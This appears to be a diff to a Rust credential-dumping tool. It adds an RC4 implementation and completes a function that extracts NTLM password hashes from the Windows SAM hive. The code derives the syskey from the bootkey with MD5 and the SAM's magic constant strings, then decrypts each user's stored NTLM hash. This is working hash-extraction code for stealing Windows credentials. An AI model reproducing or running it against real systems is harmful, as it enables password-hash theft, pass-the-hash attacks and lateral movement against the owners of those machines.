@@ -208,7 +208,7 @@ fn get_bytes_with_null(input: &str) -> Vec<u8> {
     result
 }
 
-fn get_enc_key(input_one: Vec<u8>, input_two: Vec<u8>, input_three: Vec<u8>, input_four: Vec<u8>) -> Vec<u8> {
+fn get_enc_key(input_one: Vec<u8>, input_two: Vec<u8>, input_three: Vec<u8>, input_four: Option<Vec<u8>>) -> Vec<u8> {
     let mut total = Vec::new();
 
     for i in input_one {
@@ -223,8 +223,10 @@ fn get_enc_key(input_one: Vec<u8>, input_two: Vec<u8>, input_three: Vec<u8>, inp
         total.push(i);
     }
 
-    for i in input_four {
-        total.push(i);
+    if let Some(input_four) = input_four {
+        for i in input_four {
+            total.push(i);
+        }
     }
 
     total
@@ -282,6 +284,56 @@ fn aes_128_cbc_decrypt(key: &[u8], iv: &[u8], input: Vec<u8>) -> Result<Vec<u8>>
     let cipher = Aes128Cbc::new_from_slices(&key, &iv)?;
     let mut buf = input;
     return Ok(cipher.decrypt(&mut buf)?.to_vec());
+}
+
+fn convert_to_u128(input: Vec<u8>) -> Vec<u128> {
+    let mut new: Vec<u128> = Vec::new();
+    for i in input {
+        new.push(i as u128);
+    }
+    new
+}
+
+fn convert_to_u8(input: Vec<u128>) -> Vec<u8> {
+    let mut new: Vec<u8> = Vec::new();
+    for i in input {
+        new.push(i as u8);
+    }
+    new
+}
+
+fn rc4(data: Vec<u128>, key: Vec<u128>) -> Vec<u128> {
+    let mut r: Vec<u128> = data;
+    let mut s: [u128; 256] = [0u128; 256];
+    let mut k: [u128; 256] = [0u128; 256];
+
+    for i in 0..256 {
+        s[i] = i as u128;
+        k[i] = key[i % key.len()];
+    }
+
+    let mut j: u128 = 0;
+    for i in 0..256 {
+        j = (j + s[i] + k[i]) % 256;
+        let temp = s[i];
+        s[i] = s[j as usize];
+        s[j as usize] = temp;
+    }
+        
+    let mut i = 0;
+    let mut j = 0;
+    for x in 0..r.len() {
+        i = (i + 1) % 256;
+        j = (j + s[i as usize]) % 256;
+
+        let temp = s[i as usize];
+        s[i as usize] = s[j as usize];
+        s[j as usize] = temp;
+
+        let t = ((s[i as usize] + s[j as usize]) % 256) as usize;
+        r[x] = r[x] ^ s[t];
+    }
+    r
 }
 
 fn str_to_key(input: Vec<u8>) -> [u8; 8] {
@@ -369,14 +421,24 @@ fn get_ntlm_hash() -> Result<Vec<Ntlm>> {
                                 f[112..128].to_vec(),
                                 get_bytes_with_null("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%"),
                                 bootkey.to_vec(),
-                                get_bytes_with_null("0123456789012345678901234567890123456789")
+                                Some(get_bytes_with_null("0123456789012345678901234567890123456789"))
                             ));
                             let enc_syskey_key = hasher.finalize();
 
-                            
+                            let syskey = rc4(convert_to_u128(encrypted_syskey.to_vec()), convert_to_u128(enc_syskey_key.to_vec()));
 
+                            let enc_ntlm = &v[offset as usize+4..offset as usize+4+16];
+                            let mut hasher = Md5::new();
+                            hasher.update(get_enc_key(
+                                convert_to_u8(syskey),
+                                get_deskey_key(user.clone(), vec![3,2,1,0])?,
+                                get_bytes_with_null("NTPASSWORD"),
+                                None,
+                            ));
 
-                            continue;
+                            let enc_ntlm_key = hasher.finalize();
+                            let enc_ntlm = rc4(convert_to_u128(enc_ntlm.to_vec()), convert_to_u128(enc_ntlm_key.to_vec()));
+                            Ok(convert_to_u8(enc_ntlm))
                         },
                         _ => {
                             Ok(vec![])
